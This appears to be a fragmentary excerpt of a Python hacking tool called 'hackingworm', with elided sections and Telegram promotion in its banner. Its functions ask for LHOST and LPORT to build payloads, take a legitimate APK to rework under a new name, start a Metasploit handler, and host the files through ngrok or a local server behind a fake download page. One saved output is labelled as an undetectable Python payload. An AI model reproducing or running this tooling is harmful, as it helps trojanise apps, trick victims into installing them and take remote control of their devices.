...
──██████████████████████████████████──
─████████████████████████████████████─
▐██████──███████▀▄██▄▀███████──██████▌        Telegram ID: {2}@hackerw0rm{0}
▐█████────██████████████████────█████▌
▐█████─────██████▀──▀██████─────█████▌  Telegram Channel : {2}@hackingworm{0}
─█████▄─────███────────███─────▄█████─
──██████─────█──────────█─────██████──
────█████────────────────────█████────
─────█████──────────────────█████─────
...
| $$     \  $$$/  | $$| $$      | $$      | $$  | $$ /$$__  $$| $$  | $$
| $$$$$$$$\  $/   | $$| $$      | $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$
|________/ \_/    |__/|__/      |________/ \______/  \_______/ \_______/            

'''.format(end,bold,cyan))


def main(platform, type):
    lhost = input("\n{0}{1}hackingworm:~/LHOST# {2}".format(cyan, bold, end))
    lport = input("\n{0}{1}hackingworm:~/LPORT# {2}".format(cyan, bold, end))
    nameFile = input("\n{0}{1}hackingworm:~/FileName# {2}".format(cyan, bold, end))
...
def legit(platform, type):
    lhost = input("\n{0}{1}hackingworm:~/LHOST# {2}".format(cyan, bold, end))
    lport = input("\n{0}{1}hackingworm:~/LPORT# {2}".format(cyan, bold, end))
    direct = input("\n{0}{1}hackingworm:~/Path_of_your_APK# {2}".format(cyan, bold, end))
    newname = input("\n{0}{1}hackingworm:~/NewFileName# {2}".format(cyan, bold, end))                    
...
def Ngrok():
    ...
    os.system("ls")	
    print("")
    name1=input("\n{0}{1}hackingworm:~/File# {2}".format(cyan, bold, end))
...
<input type="submit" class="btn" style="width:40%" class="fa fa-download" class="BotonDown" value="Download" onclick="document.location.href='"""+name1+"""' ">
    ...
    if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:		
      print("\n\033[1m\033[36mhackingworm:~/LinkNgrok# \033[1m\033[0m"+url)
...
<input type="submit" class="btn" style="width:40%" class="fa fa-download" class="BotonDown" value="Download" onclick="document.location.href='"""+name2+"""' ">
    ...
    #http.server 80
    os.system("python3 -m http.server 80 > .server 2> /dev/null &")          		
    print("\n\033[1m\033[36mhackingworm:~/Link_LocalHost# \033[1m\033[0m"+"http://localhost:80")
...
def MSF():
    host1=input("\n{0}{1}hackingworm:~/LHOST# {2}".format(cyan, bold, end))
    port1=input("\n{0}{1}hackingworm:~/LPORT# {2}".format(cyan, bold, end))
    payload1=input("\n{0}{1}hackingworm:~/PAYLOAD# {2}".format(cyan, bold, end))   
...
def RapidP():
    ...
    if select == '4':
        ...
        if type == '0':
            ...
            print("\n{0}{1}hackingworm:~/Save#FUD_python_hackingworm.py {2}".format(cyan, bold, end))
        elif type == '6':
            print("\033[1m\033[36m")
            os.system("ls")	
            print("")
